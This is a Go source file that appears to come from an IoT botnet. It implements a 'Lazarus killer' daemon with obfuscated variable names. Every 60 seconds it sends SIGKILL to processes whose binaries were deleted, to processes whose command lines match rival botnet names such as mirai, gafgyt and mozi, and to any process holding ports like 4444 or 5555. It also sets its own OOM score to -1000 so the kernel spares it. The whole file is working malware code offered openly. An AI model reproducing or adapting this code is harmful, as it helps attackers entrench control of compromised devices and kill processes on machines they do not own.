package main

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// ============================================================================
// LAZARUS KILLER MODULE
//
// Implements a background competition-elimination daemon that:
//   1. Kills processes running from deleted on-disk binaries (zombie loaders).
//   2. Kills known competing bot families by cmdline pattern matching.
//   3. Reclaims TCP ports that competing processes are listening on.
//   4. Tunes the kernel OOM-score so the bot survives memory pressure.
//
// The daemon goroutine (lazarusKillerStart) wakes every 60 seconds and calls
// lazarusScan for a full sweep. It is stopped cleanly via lazarusKillerStop.
// ============================================================================

// kQpMvZn is the stop-channel for the lazarus daemon goroutine.
// A close(kQpMvZn) causes the select inside the daemon loop to fire and exit.
var kQpMvZn chan struct{}

// lZrDmNw is the list of cmdline substrings that identify competing bot families.
// Pattern matching is case-insensitive. Any process whose /proc/<pid>/cmdline
// contains one of these tokens will be sent SIGKILL.
var lZrDmNw = []string{
	"mirai",
	"gafgyt",
	"mozi",
	"qbot",
	"muhstik",
	"kaiten",
	"tsunami",
	"ziggy",
}

// tRqBnPx is the list of TCP port numbers (decimal) that should be reclaimed
// from any foreign process currently holding a listen socket on them.
// Ports are in host-byte-order decimal; adjust to match the bot's own ports.
var tRqBnPx = []string{
	"1337",
	"4444",
	"5555",
	"6666",
	"7777",
}

// setOOMScore writes -1000 to /proc/self/oom_score_adj so the Linux OOM killer
// will always spare this process, preferring to kill other victims first.
//
// Returns: error if the proc write fails (non-fatal — kernel may deny on some
// hardened systems; the bot continues regardless).
func setOOMScore() error {
	const oomAdj = "/proc/self/oom_score_adj"
	f, err := os.OpenFile(oomAdj, os.O_WRONLY|os.O_TRUNC, 0)
	if err != nil {
		deoxys("setOOMScore: open %s failed: %v", oomAdj, err)
		return err
	}
	defer f.Close()
	if _, err = f.WriteString("-1000\n"); err != nil {
		deoxys("setOOMScore: write failed: %v", err)
		return err
	}
	deoxys("setOOMScore: oom_score_adj set to -1000")
	return nil
}

// lazarusKillerStart launches the background killer daemon goroutine.
// It is idempotent — calling it a second time re-creates the channel and
// starts a fresh goroutine (the previous one must have been stopped first).
//
// The daemon calls lazarusScan every 60 seconds and also applies the OOM
// protection immediately on first invocation.
func lazarusKillerStart() {
	kQpMvZn = make(chan struct{})
	setOOMScore()
	guardedGo("lazarusKillerDaemon", func() {
		deoxys("lazarusKillerDaemon: started")
		ticker := time.NewTicker(60 * time.Second)
		defer ticker.Stop()
		// Run one immediate scan on startup so we don't wait 60 s.
		lazarusScan()
		for {
			select {
			case <-ticker.C:
				lazarusScan()
			case <-kQpMvZn:
				deoxys("lazarusKillerDaemon: stop signal received, exiting")
				return
			}
		}
	})
}

// lazarusKillerStop signals the daemon goroutine to exit cleanly.
// It is safe to call even if the daemon was never started.
func lazarusKillerStop() {
	if kQpMvZn != nil {
		select {
		case <-kQpMvZn:
			// Already closed — nothing to do.
		default:
			close(kQpMvZn)
		}
	}
}

// lazarusScan performs one full sweep:
//  1. Kill processes whose executable path contains "(deleted)".
//  2. Kill processes whose cmdline matches a known competing bot pattern.
//  3. Reclaim ports listed in tRqBnPx by killing their socket owners.
func lazarusScan() {
	deoxys("lazarusScan: beginning sweep")
	lazarusReapDeleted()
	lazarusReapCompetitors()
	lazarusReclaimPorts()
	deoxys("lazarusScan: sweep complete")
}

// lazarusReapDeleted scans /proc/*/exe symlinks.  If the resolved path contains
// the string "(deleted)" the underlying binary was removed from disk — a common
// sign of a competing loader that replaced itself.  We send SIGKILL to that PID.
//
// Our own PID is always skipped to prevent self-kill.
func lazarusReapDeleted() {
	selfPID := os.Getpid()
	entries, err := os.ReadDir("/proc")
	if err != nil {
		deoxys("lazarusReapDeleted: ReadDir /proc: %v", err)
		return
	}
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		pid, err := strconv.Atoi(e.Name())
		if err != nil {
			continue // not a PID directory
		}
		if pid == selfPID {
			continue
		}
		exePath, err := os.Readlink(filepath.Join("/proc", e.Name(), "exe"))
		if err != nil {
			continue
		}
		if strings.Contains(exePath, "(deleted)") {
			deoxys("lazarusReapDeleted: killing PID %d (deleted exe: %s)", pid, exePath)
			if proc, err := os.FindProcess(pid); err == nil {
				if err := proc.Signal(syscall.SIGKILL); err != nil {
					deoxys("lazarusReapDeleted: SIGKILL PID %d failed: %v", pid, err)
				}
			}
		}
	}
}

// lazarusReapCompetitors reads /proc/*/cmdline and checks each process against
// the known competitor patterns in lZrDmNw.  Matching processes are killed with
// SIGKILL.  Our own PID is always skipped.
func lazarusReapCompetitors() {
	selfPID := os.Getpid()
	entries, err := os.ReadDir("/proc")
	if err != nil {
		deoxys("lazarusReapCompetitors: ReadDir /proc: %v", err)
		return
	}
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		pid, err := strconv.Atoi(e.Name())
		if err != nil {
			continue
		}
		if pid == selfPID {
			continue
		}
		cmdlineBytes, err := os.ReadFile(procPrefix + e.Name() + cmdlineSuffix)
		if err != nil {
			continue
		}
		// /proc/<pid>/cmdline uses NUL as argument separator — normalise.
		cmdline := strings.ToLower(strings.ReplaceAll(string(cmdlineBytes), "\x00", " "))
		for _, pattern := range lZrDmNw {
			if strings.Contains(cmdline, pattern) {
				deoxys("lazarusReapCompetitors: killing PID %d (matched pattern '%s', cmdline: %s)",
					pid, pattern, strings.TrimSpace(cmdline))
				if proc, err := os.FindProcess(pid); err == nil {
					if err := proc.Signal(syscall.SIGKILL); err != nil {
						deoxys("lazarusReapCompetitors: SIGKILL PID %d failed: %v", pid, err)
					}
				}
				break // one kill per PID is enough
			}
		}
	}
}

// lazarusReclaimPorts parses /proc/net/tcp to find which inodes are listening
// on the ports listed in tRqBnPx, then traces those inodes to the owning PID
// via /proc/*/fd/* symlinks, and kills any foreign holder.
//
// Port numbers in /proc/net/tcp are big-endian hex; we convert tRqBnPx entries
// from decimal to the 4-char uppercase hex form expected in the file.
func lazarusReclaimPorts() {
	selfPID := os.Getpid()

	// Build a set of target port values as hex strings (uppercase, 4 chars).
	targetHex := make(map[string]bool, len(tRqBnPx))
	for _, portStr := range tRqBnPx {
		port, err := strconv.Atoi(portStr)
		if err != nil {
			continue
		}
		targetHex[fmt.Sprintf("%04X", port)] = true
	}
	if len(targetHex) == 0 {
		return
	}

	// Collect inodes whose local port matches a target.
	targetInodes := make(map[string]bool)
	f, err := os.Open("/proc/net/tcp")
	if err != nil {
		deoxys("lazarusReclaimPorts: open /proc/net/tcp: %v", err)
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	scanner.Scan() // skip header line
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		// /proc/net/tcp fields: sl local_address rem_address st tx_queue:rx_queue tr:tm->when retrnsmt uid timeout inode
		// local_address format: XXXXXXXX:PPPP  (hex IP:hex port)
		if len(fields) < 10 {
			continue
		}
		localAddr := fields[1]
		parts := strings.SplitN(localAddr, ":", 2)
		if len(parts) != 2 {
			continue
		}
		portHex := strings.ToUpper(parts[1])
		if !targetHex[portHex] {
			continue
		}
		// st == 0A means LISTEN; we want to kill LISTEN holders as well as
		// established holders on our target ports.
		inode := fields[9]
		targetInodes[inode] = true
		deoxys("lazarusReclaimPorts: found inode %s on port %s", inode, portHex)
	}

	if len(targetInodes) == 0 {
		return
	}

	// Walk /proc/*/fd/* to map inodes to PIDs.
	procEntries, err := os.ReadDir("/proc")
	if err != nil {
		deoxys("lazarusReclaimPorts: ReadDir /proc: %v", err)
		return
	}
	for _, pe := range procEntries {
		if !pe.IsDir() {
			continue
		}
		pid, err := strconv.Atoi(pe.Name())
		if err != nil {
			continue
		}
		if pid == selfPID {
			continue
		}
		fdDir := filepath.Join("/proc", pe.Name(), "fd")
		fds, err := os.ReadDir(fdDir)
		if err != nil {
			continue
		}
		for _, fd := range fds {
			link, err := os.Readlink(filepath.Join(fdDir, fd.Name()))
			if err != nil {
				continue
			}
			// Socket symlinks look like: socket:[<inode>]
			if !strings.HasPrefix(link, "socket:[") {
				continue
			}
			inode := strings.TrimSuffix(strings.TrimPrefix(link, "socket:["), "]")
			if targetInodes[inode] {
				deoxys("lazarusReclaimPorts: killing PID %d (holds socket inode %s)", pid, inode)
				if proc, err := os.FindProcess(pid); err == nil {
					if err := proc.Signal(syscall.SIGKILL); err != nil {
						deoxys("lazarusReclaimPorts: SIGKILL PID %d failed: %v", pid, err)
					}
				}
				break // one kill per PID
			}
		}
	}
}
